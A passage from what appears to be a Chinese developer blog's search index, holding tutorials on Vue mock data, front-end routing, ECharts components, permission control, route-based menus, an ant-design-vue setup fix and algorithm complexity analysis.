服务。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 创建 mock 数据文件\n\n项目根目录创建 mock 文件夹来存放 mock 数据文件，然后根据业务创建对应的 mock 文件，例如 dashboard_chart.js，内容如下：\n\n```js\nfunction chart(method) {\n  let res = null;\n  switch (method) {\n    case \"GET\":\n      res = [120, 30, 40, 60, 20, 45];\n      break;\n\n    default:\n      res = null;\n      break;\n  }\n  return res;\n}\n// 因为node端使用，因此用CMD规范，而不是ES6\nmodule.exports = chart;\n```\n\n## 配置 webpack-dev-server\n\n本示例是 vue-cli 创建的项目，对应的就是在 vue.config.js 中配置 devServer，示例如下：\n\n```js\nmodule.exports = {\n  devServer: {\n    port: 3000,\n    proxy: {\n      \"/api\": {\n        target: \"http://localhost:3000\",\n        bypass: function(req, res) {\n          if (req.headers.accept.indexOf(\"html\") !== -1) {\n            console.log(\"Skipping proxy for browser request.\");\n            return \"/index.html\";\n          } else if (process.env.MOCK !== \"none\") {\n            //根据环境变量\n            const name = req.path\n              .split(\"/api/\")[1]\n              .split(\"/\")\n              .join(\"_\");\n            const chart = require(`./mock/${name}`);\n            const result = chart(req.method);\n            delete require.cache[require.resolve(`./mock/${name}`)];\n            return res.send(result);\n          }\n        }\n      }\n    }\n  }\n};\n```\n\n## 数据请求\n\n具体业务组件中的使用，axios 使用为例，如下：\n\n```js\ngetChartData() {\n  axios\n    .get(\"/api/dashboard/chart\", { params: { ID: 12345 } })\n    .then(response => {\n      this.chartOption = {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: response.data //请求的数据\n          }\n        ]\n      };\n    });\n}\n```\n\n## 多环境判断\n\n实际中，会面对多个环境，除了开发环境，还有测试环境，生产环境等。那么对于数据接口的调用也将是根据环境来区分。\n\n本次示例：\n安装 cross-env 实现跨平台，在 package.json 配置执行命令`\"serve:no-mock\": \"cross-env MOCK=none vue-cli-service serve\"`，然后在请求是判断是否用 mock 数据，示例如上。\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"前端路由原理基础","url":"%2F%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80%2F","content":"\n# 概述\n\n对于当下组件化的 SPA 应用，前端路由是一个重要组成部分，不管是 react 还是 vue，都有各自的前端路由插件。那么前端路由的基础是什么呢？本文针对 hash 与 history 模式的实现基础做个总结。[测试源码](https://github.com/jovysun/my-router)\n![测试效果预览图](my-router.gif)\n\n<!-- more -->\n\n# 详述\n\n对于单页面应用，每个页面都是组件，页面切换即组件切换，前端路由要实现的就是页面的切换，不引起刷新，同时浏览器的 history 对象中都有记录，这样才能保证“前进”“后退”有效。\n\n## hash 模式\n\nhash 是 URL 中的 hash 部分，直观表现为#及其后面的部分，例如`#/dashboard`。通常通过 a 标签实现页面锚点定位。特点就是改变 hash 部分不会引起页面的刷新，但是却可以触发 hashchange 事件。因此可以通过这个特性实现前端路由。\n\n## history 模式\n\nHTML5 引入了 history.pushState() 和 history.replaceState() 方法，它们分别可以添加和修改历史记录条目。这些方法通常与 window.onpopstate 配合使用。因此也可以通过这个特性实现前端路由。[API 详细知识见 MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/History_API)\n\n## 两种模式的优缺点\n\nhash 模式兼容性好，简单，但是不美观。history 模式美观，但是不兼容 IE8 及以下，刷新会报错，需要后端配置处理。\n\n## 简单实现\n\n糙了一点，但是对于理解两种模式的路由基础实现应该可以了。\n\n```js\nwindow.addEventListener(\"DOMContentLoaded\", readyHandler);\nfunction readyHandler() {\n  console.log(\"dom ready+++++++++++++++\");\n\n  let myContentDom = document.getElementById(\"myContent\");\n\n  // 路由\n  function router() {\n    let route = \"\";\n    if (location.hash) {\n      route = location.hash.split(\"#\")[1];\n    } else {\n      route = location.pathname;\n    }\n\n    let component = null;\n    switch (route) {\n      case \"/dashboard\":\n        component = { txt: \"我是Dashboard组件\" };\n        break;\n      case \"/my\":\n        component = { txt: \"我是My组件\" };\n        break;\n      default:\n        break;\n    }\n    renderDom(component);\n  }\n  // 渲染组件\n  function renderDom(component) {\n    myContentDom.innerHTML = component.txt;\n  }\n\n  // hash事件处理\n  function hashchangeHandler() {\n    router();\n  }\n  window.addEventListener(\"hashchange\", hashchangeHandler);\n\n  // history事件处理\n  function popstateHandler() {\n    router();\n  }\n  window.addEventListener(\"popstate\", popstateHandler);\n\n  document\n    .getElementById(\"historyBlock\")\n    .addEventListener(\"click\", function(e) {\n      // 阻止链接点击默认跳转事件\n      e.preventDefault();\n      // 添加历史，实现浏览器前进后退\n      history.pushState(null, \"\", e.target.href);\n      popstateHandler();\n    });\n}\n```\n","tags":["JavaScript"],"categories":["前端"]},{"title":"Vue实战@组件中使用ECharts","url":"%2Fvue-in-action-echarts%2F","content":"\n# 概述\n\nECharts 是一个流行的成熟的数据图表库，想在 vue 组件中使用，可以使用社区提供的封装好的 vue-eacharts 库，不过还是推荐自己分装，因为简单可靠。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 跑起来\n\n根据[官方文档](https://echarts.baidu.com/tutorial.html#%E5%9C%A8%20webpack%20%E4%B8%AD%E4%BD%BF%E7%94%A8%20ECharts)，安装完 echarts 之后，只需简单的创建个组件文件 Chart.vue，然后在 mounted 的时候初始化 echarts 实例，然后在需要的页面注册使用即可使用。\n\n### 创建 Chart 组件\n\n```html\n<template>\n  <div ref=\"myChart\"></div>\n</template>\n```\n\n```js\nimport echarts from \"echarts\";\nexport default {\n  mounted() {\n    // 基于准备好的dom，初始化echarts实例\n    var myChart = echarts.init(this.$refs.myChart);\n    // 绘制图表\n    myChart.setOption({\n      title: {\n        text: \"ECharts 入门示例\"\n      },\n      tooltip: {},\n      xAxis: {\n        data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n      },\n      yAxis: {},\n      series: [\n        {\n          name: \"销量\",\n          type: \"bar\",\n          data: [5, 20, 36, 10, 10, 20]\n        }\n      ]\n    });\n  }\n};\n```\n\n### 使用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart style=\"height:400px\" />\n  </div>\n</template>\n```\n\n```js\nimport Chart from \"../../components/Chart\";\nexport default {\n  components: {\n    Chart\n  }\n};\n```\n\n## 实际使用\n\n需要解决三个问题：一是窗口大小改变的时候图表需要重新渲染；二是引用第三方库需要及时的销毁，访问内存溢出；三是数据应该由父级传入。\n\n```js\nimport debounce from \"lodash/debounce\";\nimport echarts from \"echarts\";\nimport { addListener, removeListener } from \"resize-detector\";\nexport default {\n  props: {\n    option: {\n      type: Object,\n      default: () => {}\n    }\n  },\n  watch: {\n    option(val) {\n      this.chart.setOption(val);\n    }\n    // 深度复制，可以监听到option对象内部属性的变化，但是比较耗性能\n    // option: {\n    //   handler(val) {\n    //     this.chart.setOption(val);\n    //   },\n    //   deep: true\n    // }\n  },\n  created() {\n    this.resize = debounce(this.resize, 300);\n  },\n  mounted() {\n    this.renderChart();\n    // 监听dom变化，及时重新渲染eacharts实例\n    addListener(this.$refs.myChart, this.resize);\n  },\n  beforeDestroy() {\n    // 销毁eacharts实例\n    removeListener(this.$refs.myChart, this.resize);\n    this.chart.dispose();\n    this.chart = null;\n  },\n  methods: {\n    resize() {\n      console.log(\"resize\");\n      // 重新渲染eacharts实例\n      this.chart.resize();\n    },\n    renderChart() {\n      // 基于准备好的dom，初始化echarts实例\n      this.chart = echarts.init(this.$refs.myChart);\n      // 绘制图表\n      this.chart.setOption(this.option);\n    }\n  }\n};\n```\n\n调用 Chart 组件\n\n```html\n<template>\n  <div>\n    <Chart :option=\"chartOption\" style=\"height: 400px;\" />\n  </div>\n</template>\n```\n\n```js\nimport random from \"lodash/random\";\nimport Chart from \"../../components/Chart\";\nimport { setInterval, clearInterval } from \"timers\";\nexport default {\n  data() {\n    return {\n      chartOption: {\n        title: {\n          text: \"ECharts 入门示例\"\n        },\n        tooltip: {},\n        xAxis: {\n          data: [\"衬衫\", \"羊毛衫\", \"雪纺衫\", \"裤子\", \"高跟鞋\", \"袜子\"]\n        },\n        yAxis: {},\n        series: [\n          {\n            name: \"销量\",\n            type: \"bar\",\n            data: [5, 20, 36, 10, 10, 20]\n          }\n        ]\n      }\n    };\n  },\n  mounted() {\n    this.interval = setInterval(() => {\n      this.chartOption.series[0].data = this.chartOption.series[0].data.map(\n        () => random(100)\n      );\n      // 引用类型，重新创建对象才能保证Chart组件中监听option生效\n      this.chartOption = { ...this.chartOption };\n    }, 3000);\n  },\n  beforeDestroy() {\n    clearInterval(this.interval);\n  },\n  components: {\n    Chart\n  }\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@权限控制","url":"%2Fvue-in-action-auth%2F","content":"\n# 概述\n\n在管理系统中权限控制是一个必不可少的组成部分，包括路由控制，菜单控制，内容区控制等。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由控制\n\n### 辅助函数\n\n首先可以在项目想创建 utils 文件夹，然后创建 auth.js 文件，编写需要的功能函数。\n\n```js\nexport function getCurrentAuthority() {\n  // 后端返回用户角色\n  return [\"user\"];\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n### 导航守卫\n\n配置路由导航守卫，控制前端路由跳转。\n\n```js\nrouter.beforeEach((to, from, next) => {\n  if (to.path !== from.path) {\n    NProgress.start();\n  }\n  const record = findLast(to.matched, item => item.meta.authority);\n  if (record && !check(record.meta.authority)) {\n    if (!isLogin() && to.path !== \"/user/login\") {\n      next({\n        path: \"/user/login\"\n      });\n    } else if (to.path !== \"/403\") {\n      notification.error({\n        message: \"403\",\n        description: \"你没有权限访问，请联系管理员咨询。\"\n      });\n      next({\n        path: \"/403\"\n      });\n    }\n    NProgress.done();\n  }\n  next();\n});\n\nrouter.afterEach(() => {\n  NProgress.done();\n});\n```\n\n## 菜单控制\n\n思路就是判断权限，过滤显示菜单内容。例如基于之前动态生成菜单的实现方式，可以如下处理：\n\n```js\nlet menuData = [];\nfor (let element of routes) {\n  if (\n    element.meta &&\n    element.meta.authority &&\n    !check(element.meta.authority)\n  ) {\n    break;\n  }\n  ...\n  return menuData;\n}\n```\n\n## 精细化权限控制\n\n### 权限组件\n\n首选创建一个组件`Authorized.vue`，这里用函数式组件比较合适：\n\n```js\n<script>\nimport { check } from \"../utils/auth\";\nexport default {\n  // 指定该组件为函数式组件\n  functional: true,\n  props: {\n    authority: {\n      type: Array,\n      required: true\n    }\n  },\n  render(h, context) {\n    const { props, scopedSlots } = context;\n    return check(props.authority) ? scopedSlots.default() : null;\n  }\n};\n</script>\n```\n\n然后注册组件，推荐全局注册：\n\n```js\nimport Authorized from \"./components/Authorized\";\nVue.component(\"Authorized\", Authorized);\n```\n\n最后就可以在具体页面中使用了：\n\n```html\n<Authorized :authority=\"['admin']\">\n  <div>我是只有admin权限的用户才能看到的内容模块</div>\n</Authorized>\n```\n\n### 权限指令\n\n首先创建一个指令插件 `auth.js`：\n\n```js\nimport { check } from \"../utils/auth\";\n// 提供install方法（语法）\nfunction install(Vue, options = {}) {\n  // 定义指令\n  Vue.directive(options.name || \"auth\", {\n    // 钩子函数\n    inserted(el, binding) {\n      if (!check(binding.value)) {\n        el.parentNode && el.parentNode.removeChild(el);\n      }\n    }\n  });\n}\n\nexport default { install };\n```\n\n然后全局注册插件：\n\n```js\nimport Auth from \"./directives/auth\";\nVue.use(Auth);\n```\n\n最后就可以在需要的元素上使用该指令了：\n\n```html\n<a-icon\n  v-auth=\"['admin']\"\n  class=\"trigger\"\n  :type=\"collapsed ? 'menu-unfold' : 'menu-fold'\"\n  @click=\"foldHandler\"\n/>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@根据路由生成菜单","url":"%2Fvue-in-action-routerMenu%2F","content":"\n# 概述\n\n整体思路就是在每个路由下面增加 meta 属性维护需要在菜单显示的数据，例如`meta: { icon: \"dashboard\", title: \"仪表盘\" }`，以及加些标志位区分需要过滤掉的路由，然后遍历`routes`获取相关数据，最后页面渲染显示。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 路由配置参考\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    },\n    {\n      path: \"/403\",\n      name: \"403\",\n      hideInMenu: true,\n      component: Fobidden\n    },\n    {\n      path: \"*\",\n      name: \"404\",\n      hideInMenu: true,\n      component: NotFound\n    }\n  ]\n});\n```\n\n## 提取菜单显示所需信息\n\n```js\ngetMenuData(routes = [], parentKeys = [], selectedKey) {\n  const menuData = [];\n  routes.forEach(element => {\n    if (element.name && !element.hideInMenu) {\n      this.openKeysMap[element.path] = parentKeys;\n      this.selectedKeysMap[element.path] = [selectedKey || element.path];\n      const newItem = { ...element };\n      delete newItem.children;\n      if (element.children && !element.hideChildrenInMenu) {\n        newItem.children = this.getMenuData(element.children, [\n          ...parentKeys,\n          element.path\n        ]);\n      } else {\n        this.getMenuData(\n          element.children,\n          selectedKey ? parentKeys : [...parentKeys, element.path],\n          selectedKey || element.path\n        );\n      }\n      menuData.push(newItem);\n    } else if (\n      !element.hideInMenu &&\n      !element.hideChildrenInMenu &&\n      element.children\n    ) {\n      menuData.push(\n        ...this.getMenuData(element.children, [...parentKeys, element.path])\n      );\n    }\n  });\n  return menuData;\n}\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@高扩展性路由","url":"%2Fvue-in-action-router%2F","content":"\n# 概述\n\n一个高扩展性的路由应该是根据页面展示结构的特点进行的抽象，再结合业务模块进行的合理层级划分。本次总结是根据中后台管理系统[Ant Design Pro](https://preview.pro.ant.design/dashboard/analysis)。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n整体来说没什么难点，主要对新手有个目录结构案例参考，其次对于单纯提供 `router-view` 的组件可以用函数式组件`component: { render: h => h(\"router-view\") }`。\n\n## 第一层级\n\n第一层级应该是布局模板，例如登录注册页面与其他的内容展示页，通常页面布局结构是不同的，因此可以分成两个 UserLayout.vue 和 BasicLayout.vue。\n\n## 第二层级\n\n一级业务模块，直观的就是对应的一级菜单，例如 Dashboard、个人页等。\n\n## 其他层级\n\n按照业务模块层层嵌套，例如 Dashboard 下面有 分析页 和 监控页等。\n\n## 示例代码\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    }\n  ]\n});\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@ant-disign第一坑","url":"%2Fvue-in-action-antd%2F","content":"\n# 概述\n\n第一次用 ant-design-vue，刚启动就踩坑，记录下。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\nvue-cli3.x 创建项目\n\n按需引用 ant-design-vue 组件\n\n```shell\nnpm install ant-design-vue --save\nnpm install babel-plugin-import --save-dev\n```\n\n启动项目报错如下：\n![](1.jpg)\n项目刚开始就报错，真是让人不愉快，但是不用着急，仔细看下错误提示信息，发现有这样一句`https://github.com/ant-design/ant-motion/issues/44`，点开找下点赞比较多的，主要有两条思路：\n一，降低 less 版本；\n二，配置 less-loader 的 javascriptEnabled 为 true，如下：\n![](2.jpg)\n\n我这里是采用了方案二，创建一个 vue.config.js 然后加上配置参数，运行 OK。\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"数据结构与算法@复杂度分析","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90%2F","content":"\n# 概述\n\n复杂度分析是学习算法的非常重要的部分，主要分为时间复杂度分析和空间复杂度分析。掌握大“O”表示法及几种常见时间复杂度实例分析。知道最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度和均摊时间复杂度。\n\n<!-- more -->\n\n# 详述\n\n## 大 O 时间复杂度表示法\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum = sum + i * j;\n    }\n  }\n}\n```\n\n假如每个语句的执行时间是 unit_time，那么这段代码的总执行时间 T(n)是多少呢？\n\n<p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n * unit_time 的执行时间，第 7、8 行代码循环执行了 n<sup>2</sup>遍，所以需要 2n<sup>2</sup> * unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n<sup>2</sup>+2n+3)*unit_time。</p>\n\n<p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，<strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比</strong>。</p>\n\n总结成一个公式如下：\n![](o.png)\n\n<p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n<sup>2</sup>+2n+3)。这就是<strong>大 O 时间复杂度表示法</strong>。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示<strong>代码执行时间随数据规模增长的变化趋势</strong>，所以，也叫作<strong>渐进时间复杂度</strong>（asymptotic time complexity），简称<strong>时间复杂度</strong>。</p>\n\n<p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n<sup>2</sup>)。</p>\n\n## 时间复杂度分析\n\n1. 只关注循环执行次数最多的一段代码\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i <= n; ++i) {\n    sum = sum + 1;\n  }\n  return sum;\n}\n```\n\n以上代码总的时间复杂度就是 O(n)。\n\n2. 加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n```js\nfunction cal(n) {\n  var sum_1 = 0;\n  var p = 1;\n  for (; p < 100; ++p) {\n    sum_1 = sum_1 + p;\n  }\n\n  var sum_2 = 0;\n  var q = 1;\n  for (; q < n; ++q) {\n    sum_2 = sum_2 + q;\n  }\n\n  var sum_3 = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum_3 = sum_3 + i * j;\n    }\n  }\n\n  return sum_1 + sum_2 + sum_3;\n}\n```\n\n<p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n<sup>2</sup>)。也就是说：<strong>总的时间复杂度<strong><strong>就</strong></strong>等于量级最大的那段代码的时间复杂度</strong>。那我们将这个规律抽象成公式就是：</p>\n\n3. 乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积\n\n```js\nfunction cal(n) {\n  var ret = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    ret = ret + f(i);\n  }\n}\n\nfunction f(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    sum = sum + i;\n  }\n  return sum;\n}\n```\n\n<p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) * T2(n) = O(n*n) = O(n<sup>2</sup>)。</p>\n\n## 几种常见时间复杂度实例分析\n\n![](normal.jpg)\n\n1. O(1)\n   O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。\n\n```js\nvar i = 8;\nvar j = 6;\nvar sum = i + j;\n```\n\n<p>总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，<strong>一般<strong><strong>情况下</strong></strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)</strong>。</p>\n\n2. O(logn)、O(nlogn)\n   对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。如下代码：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 2;\n}\n```\n\n一个个列出来，就是这个样子：\n![](log.jpg)\n\n<p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2<sup>x</sup>=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log<sub>2</sub>n，所以，这段代码的时间复杂度就是 O(log<sub>2</sub>n)。</p>\n\n现在稍微改下：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 3;\n}\n```\n\n这段代码的时间复杂度为 O(log<sub>3</sub>n)。\n\n<p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？</p>\n\n<p>我们知道，对数之间是可以互相转换的，log<sub>3</sub>n 就等于 log<sub>3</sub>2 * log<sub>2</sub>n，所以 O(log<sub>3</sub>n) = O(C *  log<sub>2</sub>n)，其中 C=log<sub>3</sub>2 是一个常量。基于我们前面的一个理论：<strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))</strong>。所以，O(log<sub>2</sub>n) 就等于 O(log<sub>3</sub>n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。</p>\n\n<p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。</p>\n\n3. O(m+n)、O(m\\*n)\n\n```js\nfunction cal(m, n) {\n  var sum_1 = 0;\n  var i = 1;\n  for (; i < m; ++i) {\n    sum_1 = sum_1 + i;\n  }\n\n  var sum_2 = 0;\n  var j = 1;\n  for (; j < n; ++j) {\n    sum_2 = sum_2 + j;\n  }\n\n  return sum_1 + sum_2;\n}\n```\n\n<p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。</p>\n\n<p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)*T2(n) = O(f(m) * f(n))。</p>\n\n## 空间复杂度分析\n\n<p>前面我讲过，时间复杂度的全称是<strong>渐进时间复杂度</strong>，<strong>表示算法的执行时间与数据规模之间的增长关系</strong>。类比一下，空间复杂度全称就是<strong>渐进空间复杂度</strong>（asymptotic space complexity），<strong>表示算法的存储空间与数据规模之间的增长关系</strong>。</p>\n\n```js\nvoid print(int n) {\n  int i = 0;\n  int[] a = new int[n];\n  for (i; i <n; ++i) {\n    a[i] = i * i;\n  }\n\n  for (i = n-1; i >= 0; --i) {\n    print out a[i]\n  }\n}\n\n```\n\n<p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。</p>\n\n<p>我们常见的空间复杂度就是 O(1)、O(n)、O(n<sup>2</sup> )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。</p>\n\n## 